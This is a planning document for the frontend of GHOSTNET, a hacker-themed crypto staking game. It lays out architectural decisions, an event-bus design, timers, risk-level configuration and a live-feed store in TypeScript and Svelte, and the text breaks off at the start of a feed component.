# GHOSTNET Frontend Architecture

**Version:** 1.0  
**Status:** Planning  
**Last Updated:** 2026-01-19  
**Author:** Architecture Team

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [System Context](#2-system-context)
3. [Architectural Decisions](#3-architectural-decisions)
4. [Core Systems](#4-core-systems)
5. [Feature Modules](#5-feature-modules)
6. [UI Component System](#6-ui-component-system)
7. [Audio System](#7-audio-system)
8. [Visual Effects System](#8-visual-effects-system)
9. [State Management](#9-state-management)
10. [Web3 Integration](#10-web3-integration)
11. [Real-Time Communication](#11-real-time-communication)
12. [File Structure](#12-file-structure)
13. [Implementation Phases](#13-implementation-phases)
14. [Testing Strategy](#14-testing-strategy)
15. [Performance Considerations](#15-performance-considerations)
16. [Risk Assessment](#16-risk-assessment)
17. [Open Questions](#17-open-questions)
18. [Appendices](#appendices)

---

## 1. Executive Summary

### What We're Building

GHOSTNET is a **real-time survival game** built on MegaETH. The frontend is a terminal-aesthetic web application that:

- Displays a live feed of all network activity (stakes, deaths, extractions)
- Manages user positions across 5 risk levels (Vault to Black Ice)
- Runs mini-games that provide in-game advantages (typing challenges, hack runs)
- Delivers dopamine through sound, animation, and social proof
- Connects to smart contracts for all financial operations

### The Core Challenge

Building a **real-time, dopamine-optimized game interface** that feels like a hacker terminal while handling:

- WebSocket streams with hundreds of events per minute
- Complex state derived from multiple sources (contracts, WebSocket, local)
- Heavy visual effects without performance degradation
- Precise audio timing for feedback loops
- Wallet integration for financial transactions

### Technology Stack

| Layer | Technology | Rationale |
|-------|------------|-----------|
| Framework | SvelteKit 2.x + Svelte 5 | Runes provide reactive state without boilerplate |
| Styling | CSS Custom Properties | Terminal aesthetic is CSS-native |
| Web3 | viem + custom wallet layer | Type-safe, tree-shakeable, full control |
| Real-time | Native WebSocket | Simple, no dependencies, full control |
| Audio | ZzFX | Tiny (< 1KB), procedural, perfect for game sounds |
| Animation | CSS + Motion One | Performant, composable |
| Testing | Vitest + Playwright | Unit + E2E coverage |

### The Architectural Bet

This architecture optimizes for **real-time reactivity** and **dopamine delivery** while keeping feature modules **independently evolvable**.

The core bet: **Event-sourced UI**. All state changes flow through a central event bus. Sound, visual effects, and UI updates all subscribe to the same event stream.

---

## 2. System Context

### System Boundaries

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              GHOSTNET SYSTEM                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                        FRONTEND (This Doc)                           │    │
│  │                                                                      │    │
│  │  SvelteKit Application                                               │    │
│  │  ├── Terminal UI Shell                                               │    │
│  │  ├── Real-time Feed                                                  │    │
│  │  ├── Position Management                                             │    │
│  │  ├── Mini-Games (Typing, Hack Runs, Dead Pool)                      │    │
│  │  ├── Crew System                                                     │    │
│  │  └── Audio/Visual Effects                                            │    │
│  │                                                                      │    │
│  └──────────────────────────┬───────────────────────────────────────────┘    │
│                             │                                                │
│         ┌───────────────────┼───────────────────┐                           │
│         │                   │                   │                           │
│         ▼                   ▼                   ▼                           │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                     │
│  │   MegaETH   │    │  WebSocket  │    │   Backend   │                     │
│  │  Contracts  │    │   Server    │    │     API     │                     │
│  │             │    │             │    │             │                     │
│  │ • Core      │    │ • Events    │    │ • Auth      │                     │
│  │ • Token     │    │ • Feed      │    │ • Crews     │                     │
│  │ • Dead Pool │    │ • Sync      │    │ • Stats     │                     │
│  │ • Oracle    │    │             │    │ • Indexer   │                     │
│  └─────────────┘    └─────────────┘    └─────────────┘                     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Data Flow Overview

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                             DATA FLOW                                         │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  INBOUND (To Frontend)                                                        │
│  ─────────────────────                                                        │
│                                                                               │
│  1. Contract Events (via WebSocket server indexing)                          │
│     └── Jack ins, extractions, trace scans, deaths, cascades                 │
│                                                                               │
│  2. Contract State (via RPC reads)                                           │
│     └── Positions, balances, network vitals, timers                          │
│                                                                               │
│  3. Backend API                                                               │
│     └── Crew data, leaderboards, user profiles, historical stats             │
│                                                                               │
│  OUTBOUND (From Frontend)                                                     │
│  ──────────────────────                                                       │
│                                                                               │
│  1. Contract Transactions                                                     │
│     └── Stake, extract, claim rewards, place bets                            │
│                                                                               │
│  2. Backend API                                                               │
│     └── Crew actions, profile updates                                        │
│                                                                               │
│  3. Analytics                                                                 │
│     └── User behavior, feature usage, error tracking                         │
│                                                                               │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Architectural Decisions

This section documents the **irreversible decisions**—the bets we're placing that would be expensive to change.

### ADR-001: Event-Sourced UI State

**Status:** Accepted  
**Date:** 2026-01-19

#### Context

GHOSTNET's UI is fundamentally driven by events:
- The live feed IS the game (every visible item is an event)
- Sound effects trigger on events
- Visual effects (screen flashes) trigger on events
- Position updates come from events

We need a pattern that:
- Routes events to multiple consumers (UI, sound, effects)
- Enables debugging (replay events, time-travel)
- Keeps coupling low (producers don't know consumers)

#### Decision

Implement a **central event bus** that all state changes flow through.

```
┌────────────────────────────────────────────────────────────────────┐
│                        EVENT BUS (Central)                          │
├────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  SOURCES (Producers)              SUBSCRIBERS (Consumers)           │
│  ───────────────────              ───────────────────────           │
│  ├── WebSocket Client             ├── Feed Store                    │
│  ├── Contract Event Listener      ├── Position Store                │
│  ├── User Actions                 ├── Network Store                 │
│  ├── Timer System                 ├── Sound Manager                 │
│  └── Mini-Game Sessions           ├── Effects Manager               │
│                                   ├── Analytics                     │
│                                   └── Debug Logger                  │
│                                                                     │
└────────────────────────────────────────────────────────────────────┘
```

#### Consequences

**Positive:**
- Single source of truth for "what happened"
- Easy to add new consumers without touching producers
- Natural fit for replay/debugging
- Sound and visual effects stay synchronized

**Negative:**
- Indirection makes call stack harder to follow
- Need discipline to ensure all state changes go through events
- Potential for event ordering issues

**Mitigations:**
- Strict typing on events prevents misuse
- Logging middleware for debugging
- Timestamp all events for ordering

---

### ADR-002: Feature-Based Module Boundaries

**Status:** Accepted  
**Date:** 2026-01-19

#### Context

The application has distinct feature domains:
- Core game (positions, network, feed)
- Mini-games (typing, hack runs, dead pool)
- Social (crews, PvP)

Each has different change rates:
- Core game is stable once built
- Mini-games will evolve rapidly (add new games, tune mechanics)
- Social features will expand (more crew features, tournaments)

#### Decision

Organize code by **feature domain**, not technical layer.

```
lib/
├── core/           # Shared infrastructure (stable)
├── features/       # Feature modules (independent)
│   ├── feed/
│   ├── position/
│   ├── network/
│   ├── typing/
│   ├── hackrun/
│   ├── deadpool/
│   ├── crew/
│   └── pvp/
├── ui/             # Pure presentational components
└── audio/          # Sound system
```

Each feature module is **self-contained**:
- Has its own store(s)
- Has its own components
- Communicates via event bus
- Can be deleted without cascading changes

#### Consequences

**Positive:**
- Features can evolve independently
- Easy to understand what code affects what
- New developers can focus on single feature
- Features can be disabled/enabled at runtime

**Negative:**
- Some code duplication across features
- Need clear rules for what goes in `core/` vs feature
- Cross-feature interactions need careful design

---

### ADR-003: Three-Layer State Architecture

**Status:** Accepted  
**Date:** 2026-01-19

#### Context

State comes from multiple sources with different characteristics:
- Contract state (authoritative, requires network)
- Derived state (computed from other state)
- UI state (local, ephemeral)

Mixing these creates confusion about source of truth.

#### Decision

Separate state into **three distinct layers**:

```
┌─────────────────────────────────────────────────────────────────────┐
│                           STATE LAYERS                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  LAYER 1: SERVER STATE (Source of Truth)                            │
│  ─────────────────────────────────────────                          │
│  │                                                                   │
│  │  What: Contract data, backend data                               │
│  │  Where: Fetched via viem/API, cached in stores                   │
│  │  Invalidation: By events or explicit refresh                     │
│  │  Owner: web3 layer, API layer                                    │
│  │                                                                   │
│  │  Examples:                                                        │
│  │  • User position (level, staked amount, streak)                  │
│  │  • Network TVL, operator count                                   │
│  │  • Timer target timestamps                                       │
│  │  • Token balances                                                │
│  │                                                                   │
│  ├───────────────────────────────────────────────────────────────────│
│                                                                      │
│  LAYER 2: DERIVED STATE (Computed)                                  │
│  ──────────────────────────────────                                 │
│  │                                                                   │
│  │  What: Values calculated from server state + rules               │
│  │  Where: $derived() in stores                                     │
│  │  Invalidation: Automatic (reactive)                              │
│  │  Owner: Feature stores                                           │
│  │                                                                   │
│  │  Examples:                                                        │
│  │  • Effective death rate (base × modifiers)                       │
│  │  • Time remaining (target timestamp - now)                       │
│  │  • APY display value                                             │
│  │  • Feed item priority sorting                                    │
│  │                                                                   │
│  ├───────────────────────────────────────────────────────────────────│
│                                                                      │
│  LAYER 3: UI STATE (Local/Ephemeral)                                │
│  ────────────────────────────────────                               │
│  │                                                                   │
│  │  What: Component-local state, not persisted                      │
│  │  Where: $state() in components                                   │
│  │  Invalidation: Component lifecycle                               │
│  │  Owner: Individual components                                    │
│  │                                                                   │
│  │  Examples:                                                        │
│  │  • Which panel/tab is selected                                   │
│  │  • Modal open/closed                                             │
│  │  • Input field values before submission                          │
│  │  • Hover states, animation states                                │
│  │                                                                   │
└─────────────────────────────────────────────────────────────────────┘
```

#### Consequences

**Positive:**
- Clear ownership of each piece of state
- Easier debugging (know where to look)
- Prevents accidental local overrides of server state

**Negative:**
- More verbose for simple cases
- Need discipline to maintain separation

---

### ADR-004: Centralized Effects System

**Status:** Accepted  
**Date:** 2026-01-19

#### Context

Effects (sound, visual) need to trigger from various events:
- Death event → red screen flash + death sound
- Survival → green flash + survival chime
- Typing keystroke → key press sound
- Big win → jackpot fanfare + particle effects

If effects are scattered in components:
- Hard to ensure consistency
- Hard to disable all effects (accessibility)
- Hard to tune "dopamine levels"

#### Decision

Create a **centralized effects manager** that subscribes to the event bus.

```typescript
// lib/core/effects/manager.svelte.ts

export function createEffectsManager(
  eventBus: EventBus,
  audioManager: AudioManager,
  visualManager: VisualManager
) {
  // Death events
  eventBus.subscribe('TRACED', (event) => {
    if (event.isCurrentUser) {
      audioManager.play('traced', { volume: 1.0 });
      visualManager.screenFlash('red', 500);
      visualManager.shake(300);
    } else {
      audioManager.play('traced', { volume: 0.2 });
      visualManager.feedHighlight(event.id, 'red');
    }
  });

  // Survival events
  eventBus.subscribe('SURVIVED', (event) => {
    if (event.isCurrentUser) {
      audioManager.play('survived', { volume: 0.8 });
      visualManager.screenFlash('green', 300);
      visualManager.particleBurst('ghost', event.position);
    }
  });

  // Typing events
  eventBus.subscribe('TYPING_KEYSTROKE', (event) => {
    audioManager.play(event.correct ? 'keyPress' : 'keyError');
  });

  // ... more mappings
}
```

#### Consequences

**Positive:**
- All effects in one place (easy to tune)
- Easy to disable all effects
- Consistent event-to-effect mapping
- Components stay pure (no effect logic)

**Negative:**
- Another layer of indirection
- Manager knows about many event types

---

### ADR-005: CSS-First Visual Effects

**Status:** Accepted  
**Date:** 2026-01-19

#### Context

The terminal aesthetic requires:
- CRT scanlines
- Screen flicker
- Text glow
- Screen flashes (red/green)
- Number animations

Options:
1. Canvas-based rendering
2. WebGL shaders
3. CSS effects

#### Decision

Use **CSS Custom Properties + CSS animations** for all effects.

Rationale:
- Terminal aesthetic is fundamentally text-based
- CSS transforms are GPU-accelerated
- No canvas complexity for primarily text UI
- Easier to maintain and adjust

```css
/* CRT Scanlines - pure CSS */
.terminal::before {
  content: "";
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(
    0deg,
    transparent,
    transparent 1px,
    rgba(0, 255, 0, 0.03) 2px,
    rgba(0, 255, 0, 0.03) 3px
  );
  pointer-events: none;
  z-index: 100;
}

/* Screen flash - CSS variable driven */
.screen-flash {
  position: fixed;
  inset: 0;
  background: var(--flash-color, transparent);
  opacity: var(--flash-opacity, 0);
  transition: opacity 0.1s ease-out;
  pointer-events: none;
  z-index: 1000;
}
```

#### Consequences

**Positive:**
- Performant (GPU-accelerated)
- Simple to implement and maintain
- Works well with Svelte transitions
- Easy to disable for accessibility

**Negative:**
- Some effects harder than with canvas
- Browser inconsistencies possible

---

## 4. Core Systems

### 4.1 Event System

The event system is the **central nervous system** of the application.

#### Event Type Definitions

```typescript
// lib/core/events/types.ts

/**
 * All events that flow through the system.
 * 
 * Naming convention:
 * - PAST TENSE for things that happened (TRACED, SURVIVED, EXTRACTED)
 * - PRESENT TENSE for warnings/ongoing (TRACE_SCAN_WARNING)
 * - USER_ prefix for user-initiated actions
 * - WS_ prefix for connection events
 */

// ============================================================
// NETWORK EVENTS (from WebSocket / contract)
// ============================================================

export interface JackInEvent {
  type: 'JACK_IN';
  id: string;
  address: `0x${string}`;
  level: Level;
  amount: bigint;
  timestamp: number;
}

export interface ExtractEvent {
  type: 'EXTRACT';
  id: string;
  address: `0x${string}`;
  amount: bigint;
  gain: bigint;
  timestamp: number;
}

export interface TracedEvent {
  type: 'TRACED';
  id: string;
  address: `0x${string}`;
  level: Level;
  amountLost: bigint;
  timestamp: number;
}

export interface SurvivedEvent {
  type: 'SURVIVED';
  id: string;
  address: `0x${string}`;
  level: Level;
  streak: number;
  timestamp: number;
}

export interface TraceScanWarningEvent {
  type: 'TRACE_SCAN_WARNING';
  level: Level;
  secondsUntil: number;
  timestamp: number;
}

export interface TraceScanStartEvent {
  type: 'TRACE_SCAN_START';
  level: Level;
  timestamp: number;
}

export interface TraceScanCompleteEvent {
  type: 'TRACE_SCAN_COMPLETE';
  level: Level;
  survivors: number;
  traced: number;
  timestamp: number;
}

export interface CascadeEvent {
  type: 'CASCADE';
  sourceLevel: Level;
  distributions: {
    level: Level;
    amount: bigint;
  }[];
  burned: bigint;
  timestamp: number;
}

export interface WhaleAlertEvent {
  type: 'WHALE_ALERT';
  address: `0x${string}`;
  level: Level;
  amount: bigint;
  timestamp: number;
}

export interface SystemResetWarningEvent {
  type: 'SYSTEM_RESET_WARNING';
  secondsUntil: number;
  timestamp: number;
}

export interface SystemResetEvent {
  type: 'SYSTEM_RESET';
  penaltyPercent: number;
  jackpotWinner: `0x${string}`;
  jackpotAmount: bigint;
  timestamp: number;
}

// ============================================================
// USER ACTION EVENTS (from UI interactions)
// ============================================================

export interface UserJackInEvent {
  type: 'USER_JACK_IN';
  level: Level;
  amount: bigint;
}

export interface UserExtractEvent {
  type: 'USER_EXTRACT';
  positionId: string;
}

export interface UserTypingStartEvent {
  type: 'USER_TYPING_START';
}

export interface UserTypingCompleteEvent {
  type: 'USER_TYPING_COMPLETE';
  accuracy: number;
  wpm: number;
  command: string;
}

export interface TypingKeystrokeEvent {
  type: 'TYPING_KEYSTROKE';
  correct: boolean;
}

// ============================================================
// TIMER EVENTS (client-side clock)
// ============================================================

export interface TimerTickEvent {
  type: 'TIMER_TICK';
  timers: {
    systemReset: number;
    traceScan: Record<Level, number>;
  };
}

// ============================================================
// CONNECTION EVENTS
// ============================================================

export interface WSConnectedEvent {
  type: 'WS_CONNECTED';
  timestamp: number;
}

export interface WSDisconnectedEvent {
  type: 'WS_DISCONNECTED';
  timestamp: number;
}

export interface WSReconnectingEvent {
  type: 'WS_RECONNECTING';
  attempt: number;
  timestamp: number;
}

// ============================================================
// UNION TYPE
// ============================================================

export type GhostNetEvent =
  // Network
  | JackInEvent
  | ExtractEvent
  | TracedEvent
  | SurvivedEvent
  | TraceScanWarningEvent
  | TraceScanStartEvent
  | TraceScanCompleteEvent
  | CascadeEvent
  | WhaleAlertEvent
  | SystemResetWarningEvent
  | SystemResetEvent
  // User Actions
  | UserJackInEvent
  | UserExtractEvent
  | UserTypingStartEvent
  | UserTypingCompleteEvent
  | TypingKeystrokeEvent
  // Timer
  | TimerTickEvent
  // Connection
  | WSConnectedEvent
  | WSDisconnectedEvent
  | WSReconnectingEvent;

// ============================================================
// HELPER TYPES
// ============================================================

export type Level = 'VAULT' | 'MAINFRAME' | 'SUBNET' | 'DARKNET' | 'BLACK_ICE';

export type EventType = GhostNetEvent['type'];

export type EventOfType<T extends EventType> = Extract<GhostNetEvent, { type: T }>;
```

#### Event Bus Implementation

```typescript
// lib/core/events/bus.svelte.ts

import type { GhostNetEvent, EventType, EventOfType } from './types';

type Subscriber<T extends EventType> = (event: EventOfType<T>) => void;
type WildcardSubscriber = (event: GhostNetEvent) => void;

export interface EventBus {
  subscribe<T extends EventType>(type: T, handler: Subscriber<T>): () => void;
  subscribeAll(handler: WildcardSubscriber): () => void;
  emit(event: GhostNetEvent): void;
}

export function createEventBus(): EventBus {
  const subscribers = new Map<EventType, Set<Subscriber<any>>>();
  const wildcardSubscribers = new Set<WildcardSubscriber>();

  // Debug logging in development
  const DEBUG = import.meta.env.DEV;

  function subscribe<T extends EventType>(
    type: T,
    handler: Subscriber<T>
  ): () => void {
    if (!subscribers.has(type)) {
      subscribers.set(type, new Set());
    }
    subscribers.get(type)!.add(handler);

    // Return unsubscribe function
    return () => {
      subscribers.get(type)?.delete(handler);
    };
  }

  function subscribeAll(handler: WildcardSubscriber): () => void {
    wildcardSubscribers.add(handler);
    return () => wildcardSubscribers.delete(handler);
  }

  function emit(event: GhostNetEvent): void {
    if (DEBUG) {
      console.debug('[EventBus]', event.type, event);
    }

    // Notify specific subscribers
    subscribers.get(event.type)?.forEach((handler) => {
      try {
        handler(event);
      } catch (error) {
        console.error(`[EventBus] Error in handler for ${event.type}:`, error);
      }
    });

    // Notify wildcard subscribers
    wildcardSubscribers.forEach((handler) => {
      try {
        handler(event);
      } catch (error) {
        console.error('[EventBus] Error in wildcard handler:', error);
      }
    });
  }

  return { subscribe, subscribeAll, emit };
}

// ============================================================
// CONTEXT KEY (for Svelte context)
// ============================================================

export const EVENT_BUS_KEY = Symbol('eventBus');
```

#### Event Bus Usage Patterns

```typescript
// In root layout - create and provide
// routes/+layout.svelte

<script lang="ts">
  import { setContext } from 'svelte';
  import { createEventBus, EVENT_BUS_KEY } from '$lib/core/events/bus.svelte';
  
  const eventBus = createEventBus();
  setContext(EVENT_BUS_KEY, eventBus);
</script>

// In any component - consume
// lib/features/feed/FeedPanel.svelte

<script lang="ts">
  import { getContext, onDestroy } from 'svelte';
  import { EVENT_BUS_KEY, type EventBus } from '$lib/core/events/bus.svelte';
  
  const eventBus = getContext<EventBus>(EVENT_BUS_KEY);
  
  // Subscribe and auto-cleanup
  const unsubscribe = eventBus.subscribe('TRACED', (event) => {
    console.log('Someone got traced:', event.address);
  });
  
  onDestroy(unsubscribe);
</script>
```

---

### 4.2 Timer System

GHOSTNET has multiple countdown timers:
- System reset timer (global)
- Trace scan timers (per level)
- Mini-game timers (local)

#### Timer Store

```typescript
// lib/core/timers/store.svelte.ts

import type { EventBus } from '$lib/core/events/bus.svelte';
import type { Level } from '$lib/core/events/types';

export interface Timers {
  systemReset: number;        // seconds until reset
  traceScan: Record<Level, number>;  // seconds until scan per level
}

export function createTimerStore(eventBus: EventBus) {
  // Target timestamps (from server/contract)
  let systemResetTarget = $state<number | null>(null);
  let traceScanTargets = $state<Record<Level, number | null>>({
    VAULT: null,
    MAINFRAME: null,
    SUBNET: null,
    DARKNET: null,
    BLACK_ICE: null,
  });

  // Current time (updated by tick)
  let now = $state(Date.now());

  // Derived: seconds remaining
  let systemResetSeconds = $derived(
    systemResetTarget ? Math.max(0, Math.floor((systemResetTarget - now) / 1000)) : null
  );

  let traceScanSeconds = $derived(() => {
    const result: Record<Level, number | null> = {} as any;
    for (const level of Object.keys(traceScanTargets) as Level[]) {
      const target = traceScanTargets[level];
      result[level] = target ? Math.max(0, Math.floor((target - now) / 1000)) : null;
    }
    return result;
  });

  // Tick interval
  let tickInterval: ReturnType<typeof setInterval> | null = null;

  function start() {
    if (tickInterval) return;

    tickInterval = setInterval(() => {
      now = Date.now();

      // Emit tick event for any listeners
      eventBus.emit({
        type: 'TIMER_TICK',
        timers: {
          systemReset: systemResetSeconds ?? 0,
          traceScan: traceScanSeconds() as Record<Level, number>,
        },
      });

      // Check for warnings
      checkWarnings();
    }, 1000);
  }

  function stop() {
    if (tickInterval) {
      clearInterval(tickInterval);
      tickInterval = null;
    }
  }

  function checkWarnings() {
    // System reset warnings
    const sr = systemResetSeconds;
    if (sr !== null) {
      if (sr === 300) eventBus.emit({ type: 'SYSTEM_RESET_WARNING', secondsUntil: 300, timestamp: now });
      if (sr === 60) eventBus.emit({ type: 'SYSTEM_RESET_WARNING', secondsUntil: 60, timestamp: now });
      if (sr === 10) eventBus.emit({ type: 'SYSTEM_RESET_WARNING', secondsUntil: 10, timestamp: now });
    }

    // Trace scan warnings
    for (const [level, seconds] of Object.entries(traceScanSeconds())) {
      if (seconds === 60 || seconds === 10) {
        eventBus.emit({
          type: 'TRACE_SCAN_WARNING',
          level: level as Level,
          secondsUntil: seconds,
          timestamp: now,
        });
      }
    }
  }

  function setSystemResetTarget(timestamp: number) {
    systemResetTarget = timestamp;
  }

  function setTraceScanTarget(level: Level, timestamp: number) {
    traceScanTargets[level] = timestamp;
  }

  return {
    get systemResetSeconds() { return systemResetSeconds; },
    get traceScanSeconds() { return traceScanSeconds(); },
    setSystemResetTarget,
    setTraceScanTarget,
    start,
    stop,
  };
}
```

---

### 4.3 Constants and Configuration

```typescript
// lib/core/constants.ts

import type { Level } from './events/types';

// ============================================================
// SECURITY CLEARANCE LEVELS
// ============================================================

export const LEVELS: Level[] = [
  'VAULT',
  'MAINFRAME', 
  'SUBNET',
  'DARKNET',
  'BLACK_ICE',
];

export const LEVEL_CONFIG: Record<Level, {
  name: string;
  displayName: string;
  baseDeathRate: number;      // 0-1
  scanFrequencyHours: number;
  targetApy: string;          // Display string
  minStake: bigint;           // In token units
  description: string;
}> = {
  VAULT: {
    name: 'VAULT',
    displayName: 'THE VAULT',
    baseDeathRate: 0,
    scanFrequencyHours: Infinity,
    targetApy: '100-500%',
    minStake: 100n * 10n ** 18n,
    description: 'Safe haven. Absorbs yield from all levels below.',
  },
  MAINFRAME: {
    name: 'MAINFRAME',
    displayName: 'MAINFRAME',
    baseDeathRate: 0.02,
    scanFrequencyHours: 24,
    targetApy: '1,000%',
    minStake: 50n * 10n ** 18n,
    description: 'Conservative. Eats yield from Levels 3, 4, 5.',
  },
  SUBNET: {
    name: 'SUBNET',
    displayName: 'SUBNET',
    baseDeathRate: 0.15,
    scanFrequencyHours: 8,
    targetApy: '5,000%',
    minStake: 30n * 10n ** 18n,
    description: 'The Mid-Curve. Balance of survival and greed.',
  },
  DARKNET: {
    name: 'DARKNET',
    displayName: 'DARKNET',
    baseDeathRate: 0.40,
    scanFrequencyHours: 2,
    targetApy: '20,000%',
    minStake: 15n * 10n ** 18n,
    description: 'The Degen zone. High velocity. Feeds L1-3.',
  },
  BLACK_ICE: {
    name: 'BLACK_ICE',
    displayName: 'BLACK ICE',
    baseDeathRate: 0.90,
    scanFrequencyHours: 0.5,
    targetApy: 'Instant 2x',
    minStake: 5n * 10n ** 18n,
    description: 'The Casino. 30-minute rounds. Double or Nothing.',
  },
};

// ============================================================
// FEED CONFIGURATION
// ============================================================

export const FEED_CONFIG = {
  maxItems: 100,           // Max items to keep in memory
  visibleItems: 15,        // Max items to display
  
  // Priority weights (higher = stays visible longer)
  priority: {
    TRACED: 10,
    WHALE_ALERT: 9,
    SYSTEM_RESET: 8,
    TRACE_SCAN_COMPLETE: 7,
    TRACE_SCAN_WARNING: 6,
    EXTRACT: 5,
    CASCADE: 4,
    SURVIVED: 3,
    JACK_IN: 1,
  } as Record<string, number>,

  // Whale threshold
  whaleThreshold: 5000n * 10n ** 18n,  // 5000 $DATA
};

// ============================================================
// TYPING GAME CONFIGURATION  
// ============================================================

export const TYPING_CONFIG = {
  countdownSeconds: 3,
  timeLimitSeconds: 60,
  
  // Reward tiers based on accuracy
  rewardTiers: [
    { minAccuracy: 0.95, deathRateReduction: -0.20, label: 'Perfect' },
    { minAccuracy: 0.85, deathRateReduction: -0.15, label: 'Excellent' },
    { minAccuracy: 0.70, deathRateReduction: -0.10, label: 'Good' },
    { minAccuracy: 0.50, deathRateReduction: -0.05, label: 'Okay' },
  ],
  
  // Speed bonuses
  speedBonuses: [
    { minWpm: 100, minAccuracy: 0.95, bonusReduction: -0.10 },
    { minWpm: 80, minAccuracy: 0.95, bonusReduction: -0.05 },
  ],
};

// ============================================================
// VISUAL TIMING
// ============================================================

export const TIMING = {
  screenFlashDuration: 300,     // ms
  deathFlashDuration: 500,      // ms
  feedItemFadeIn: 200,          // ms
  numberAnimationDuration: 500, // ms
  tooltipDelay: 500,            // ms
};
```

---

## 5. Feature Modules

Each feature is a self-contained module with:
- **Store(s):** Reactive state management
- **Components:** UI for the feature
- **Utils:** Helper functions
- **Types:** Feature-specific types

### 5.1 Feed Module

The live feed is the **heart of GHOSTNET**—it's where the dopamine lives.

#### Feed Store

```typescript
// lib/features/feed/store.svelte.ts

import type { EventBus } from '$lib/core/events/bus.svelte';
import type { GhostNetEvent, Level } from '$lib/core/events/types';
import { FEED_CONFIG } from '$lib/core/constants';

// ============================================================
// TYPES
// ============================================================

export interface FeedItem {
  id: string;
  type: GhostNetEvent['type'];
  event: GhostNetEvent;
  priority: number;
  timestamp: number;
  isCurrentUser: boolean;
  formattedText: string;
}

// ============================================================
// STORE FACTORY
// ============================================================

export function createFeedStore(
  eventBus: EventBus,
  getCurrentUserAddress: () => `0x${string}` | null
) {
  let items = $state<FeedItem[]>([]);

  // Event types we care about
  const TRACKED_EVENTS = [
    'JACK_IN',
    'EXTRACT',
    'TRACED',
    'SURVIVED',
    'TRACE_SCAN_WARNING',
    'TRACE_SCAN_START',
    'TRACE_SCAN_COMPLETE',
    'CASCADE',
    'WHALE_ALERT',
    'SYSTEM_RESET_WARNING',
    'SYSTEM_RESET',
  ] as const;

  // Subscribe to all tracked events
  const unsubscribers: (() => void)[] = [];

  function init() {
    for (const eventType of TRACKED_EVENTS) {
      const unsub = eventBus.subscribe(eventType, (event: GhostNetEvent) => {
        addItem(event);
      });
      unsubscribers.push(unsub);
    }
  }

  function destroy() {
    unsubscribers.forEach(unsub => unsub());
  }

  function addItem(event: GhostNetEvent) {
    const userAddress = getCurrentUserAddress();
    const isCurrentUser = 'address' in event && event.address === userAddress;

    const item: FeedItem = {
      id: crypto.randomUUID(),
      type: event.type,
      event,
      priority: FEED_CONFIG.priority[event.type] ?? 0,
      timestamp: 'timestamp' in event ? event.timestamp : Date.now(),
      isCurrentUser,
      formattedText: formatEventText(event, isCurrentUser),
    };

    // Add to front, trim to max
    items = [item, ...items].slice(0, FEED_CONFIG.maxItems);
  }

  // Derived: visible items (respecting priority)
  let visibleItems = $derived.by(() => {
    return items
      .slice(0, FEED_CONFIG.visibleItems * 2) // Consider 2x for priority sorting
      .sort((a, b) => {
        // Recent items first, but high priority stays longer
        const timeDiff = b.timestamp - a.timestamp;
        const priorityBonus = (b.priority - a.priority) * 5000; // 5 sec per priority level
        return timeDiff - priorityBonus;
      })
      .slice(0, FEED_CONFIG.visibleItems);
  });

  // Derived: stats
  let stats = $derived.by(() => {
    const lastHour = Date.now() - 60 * 60 * 1000;
    const recentItems = items.filter(i => i.timestamp > lastHour);

    return {
      deaths: recentItems.filter(i => i.type === 'TRACED').length,
      jackIns: recentItems.filter(i => i.type === 'JACK_IN').length,
      extractions: recentItems.filter(i => i.type === 'EXTRACT').length,
    };
  });

  return {
    get items() { return items; },
    get visibleItems() { return visibleItems; },
    get stats() { return stats; },
    init,
    destroy,
    clear: () => { items = []; },
  };
}

// ============================================================
// FORMATTING
// ============================================================

function formatEventText(event: GhostNetEvent, isCurrentUser: boolean): string {
  const addr = 'address' in event ? truncateAddress(event.address) : '';
  const you = isCurrentUser ? ' (YOU)' : '';

  switch (event.type) {
    case 'JACK_IN':
      return `> ${addr}${you} jacked in [${event.level}] ${formatAmount(event.amount)}`;
    
    case 'EXTRACT':
      const gainStr = event.gain > 0n ? ` [+${formatAmount(event.gain)} gain]` : '';
      return `> ${addr}${you} extracted ${formatAmount(event.amount)}${gainStr}`;
    
    case 'TRACED':
      return `> ${addr}${you} ████ TRACED ████ -${formatAmount(event.amountLost)}`;
    
    case 'SURVIVED':
      return `> ${addr}${you} survived [${event.level}] streak: ${event.streak}`;
    
    case 'TRACE_SCAN_WARNING':
      return `> ⚠ TRACE SCAN [${event.level}] in ${formatTime(event.secondsUntil)} ⚠`;
    
    case 'TRACE_SCAN_START':
      return `> ░░░░░ SCANNING ${event.level} ░░░░░`;
    
    case 'TRACE_SCAN_COMPLETE':
      return `> SCAN COMPLETE: ${event.survivors} ghosts, ${event.traced} traced`;
    
    case 'CASCADE':
      return `> CASCADE: ${formatAmount(event.burned)} BURNED`;
    
    case 'WHALE_ALERT':
      return `> 🐋 WHALE: ${addr} jacked in [${event.level}] ${formatAmount(event.amount)}`;
    
    case 'SYSTEM_RESET_WARNING':
      return `> ⛔ SYSTEM RESET in ${formatTime(event.secondsUntil)} ⛔`;
    
    case 'SYSTEM_RESET':
      return `> SYSTEM RESET - ${event.penaltyPercent}% penalty applied`;
    
    default:
      return `> [${event.type}]`;
  }
}

function truncateAddress(address: string): string {
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function formatAmount(amount: bigint): string {
  const num = Number(amount / 10n ** 18n);
  return `${num.toLocaleString()}Đ`;
}

function formatTime(seconds: number): string {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return mins > 0 ? `${mins}:${secs.toString().padStart(2, '0')}` : `${secs}s`;
}
```

#### Feed Components

```svelte
<!-- lib/features/feed/FeedPanel.svelte -->
<script lang="ts">
  import { getContext, onMount, onDestroy } from 'svelte';
  import { createFeedStore } from './store.svelte';
  import { EVENT_BUS_KEY, type EventBus } from '$lib/core/events/bus.svelte';
  import { WEB3_KEY, type Web3Client } from '$lib/core/web3/client.svelte';
  import FeedItem from './FeedItem.svelte';
